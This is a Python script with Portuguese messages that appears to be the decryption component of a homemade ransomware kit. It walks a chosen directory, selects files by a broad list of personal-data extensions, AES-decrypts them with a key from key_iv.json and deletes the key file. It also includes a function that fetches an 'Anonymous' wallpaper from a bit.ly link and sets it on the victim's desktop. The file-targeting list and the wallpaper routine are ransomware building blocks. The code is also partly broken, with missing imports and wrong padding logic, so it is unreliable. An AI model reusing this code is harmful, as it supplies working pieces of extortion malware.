from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from random import randint
from time import sleep
from colorama import Fore, Back, Style
import os, base64, json

path = os.path.abspath("<INSERIR DIRETORIO AQUI>")

def set_wallpaper():
    os.chdir(path)
    response = requests.get("https://bit.ly/3BGQGYJ")
    file = open(os.getcwd()+'/anonymous.png', 'wb')
    file.write(response.content)
    file.close()
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.getcwd()+'/anonymous.png', 0)

def jsonFile():
    with open(path + '\\key_iv.json', 'r') as jsonFile:
        json_data = json.load(jsonFile)
        json_key = json_data['key']
        json_iv = json_data['iv']
        jsonFile.close()

    return json_key, json_iv

def discoverFiles(startpath):
    extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats

            'wasted', 'eslock' # ransomware extension
        ] # you can add as many file-extensions as you like in a list

    for root, directories, files in os.walk(startpath):
        for name in files:
            absolute_path = os.path.abspath(os.path.join(root, name))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

if __name__ == "__main__":
    x = discoverFiles(path)
    
    jsonFile = jsonFile() # get json file
    # x_key = input("Key: ")
    key = jsonFile[0] # key
    key = bytes(key, encoding='utf8') # key

    # y_iv = input("Iv: ")
    iv = jsonFile[1] # iv
    iv = bytes(iv, encoding='utf8') # iv

    for i in x:
        sleep(randint(1,2)) # random sleep
        with open(f'{i}', 'r+b') as read_file: # open file
            byte_read = read_file.read() # read file
            print("Decriptando o arquivo...") # print
            print(f'Arquivo {Fore.GREEN + i + Style.RESET_ALL} decriptografado com sucesso!') # print
            # print(len(byte_read))            
            decryption_suite = AES.new(key, AES.MODE_CFB, iv) # create AES object
            dec = base64.b64decode(byte_read) # decode
            if len(i) % AES.block_size != 0: # if file is not multiple of 16
                plain_text = unpad(decryption_suite.decrypt(dec), 128) # unpad
            else:
                plain_text = decryption_suite.decrypt(dec) # decrypt
            file = open(f'{i}', "wb") # open file
            file.write(plain_text) # write
            file.close() # close
    # os.remove(os.getcwd()+'/you_has_been_encrypted.png')
    os.remove(path + '/key_iv.json') # remove json file
    # set_wallpaper()
    print(Fore.GREEN + 'TODOS OS SEUS ARQUIVOS FORAM DESCRIPTOGRAFADOS' + Style.RESET_ALL) # print
